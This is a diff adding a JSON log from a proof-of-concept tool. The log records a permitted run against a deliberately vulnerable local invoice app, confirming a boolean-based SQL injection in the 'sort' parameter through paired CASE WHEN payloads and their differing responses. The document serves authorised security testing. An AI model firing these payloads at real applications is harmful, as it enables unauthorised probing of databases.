@@ -1,0 +1,93 @@
+{
+  "tool": "run_poc",
+  "version": "1.0.0",
+  "finding": "F-6",
+  "poc_file": "sqli-sort.json",
+  "target": "http://127.0.0.1:5057",
+  "permission": "Example run: the skill's author started the deliberately vulnerable sample app on 127.0.0.1:5057 for this run and allowed safe PoCs against it",
+  "allow_hosts": [],
+  "started_at": "2026-11-10T04:26:52Z",
+  "finished_at": "2026-11-10T04:26:52Z",
+  "safety": {
+    "checked": true,
+    "issues": []
+  },
+  "steps": [
+    {
+      "name": "login as alice",
+      "request": {
+        "method": "POST",
+        "url": "http://127.0.0.1:5057/login",
+        "headers": {
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        "body": "email=alice%40example.test&password=alice-test-pw"
+      },
+      "response": {
+        "status": 302,
+        "headers": {
+          "Server": "Werkzeug/3.0.1 Python/3.12.10",
+          "Content-Type": "text/html; charset=utf-8",
+          "Content-Length": "205",
+          "Location": "/invoices",
+          "Set-Cookie": "session=<redacted>; HttpOnly; Path=/"
+        },
+        "body_excerpt": "<!doctype html>\n<html lang=en>\n<title>Redirecting...</title>\n<h1>Redirecting...</h1>\n<p>You should be redirected automatically to the target URL: <a href=\"/invoices\">/invoices</a>. If not, click the link.\n",
+        "body_length": 205,
+        "elapsed_ms": 525
+      },
+      "expect_status_met": true
+    },
+    {
+      "name": "true condition",
+      "request": {
+        "method": "GET",
+        "url": "http://127.0.0.1:5057/invoices?sort=CASE+WHEN+%281%3D1%29+THEN+amount+ELSE+number+END",
+        "headers": {},
+        "body": null
+      },
+      "response": {
+        "status": 200,
+        "headers": {
+          "Server": "Werkzeug/3.0.1 Python/3.12.10",
+          "Content-Type": "application/json",
+          "Content-Length": "169"
+        },
+        "body_excerpt": "[{\"amount\":450.5,\"customer\":\"Globex\",\"id\":2,\"number\":\"INV-1002\",\"status\":\"paid\"},{\"amount\":1200.0,\"customer\":\"Acme Pty Ltd\",\"id\":1,\"number\":\"INV-1001\",\"status\":\"sent\"}]\n",
+        "body_length": 169,
+        "elapsed_ms": 3
+      },
+      "expect_status_met": null
+    },
+    {
+      "name": "false condition",
+      "request": {
+        "method": "GET",
+        "url": "http://127.0.0.1:5057/invoices?sort=CASE+WHEN+%281%3D2%29+THEN+amount+ELSE+number+END",
+        "headers": {},
+        "body": null
+      },
+      "response": {
+        "status": 200,
+        "headers": {
+          "Server": "Werkzeug/3.0.1 Python/3.12.10",
+          "Content-Type": "application/json",
+          "Content-Length": "169"
+        },
+        "body_excerpt": "[{\"amount\":1200.0,\"customer\":\"Acme Pty Ltd\",\"id\":1,\"number\":\"INV-1001\",\"status\":\"sent\"},{\"amount\":450.5,\"customer\":\"Globex\",\"id\":2,\"number\":\"INV-1002\",\"status\":\"paid\"}]\n",
+        "body_length": 169,
+        "elapsed_ms": 13
+      },
+      "expect_status_met": null
+    }
+  ],
+  "proof": {
+    "type": "boolean_diff",
+    "true_step": "true condition",
+    "false_step": "false condition",
+    "marker": "[{\"amount\":450.5",
+    "passed": true,
+    "observed": "marker in true-condition response: True; in false-condition response: False"
+  },
+  "result": "confirmed"
+}
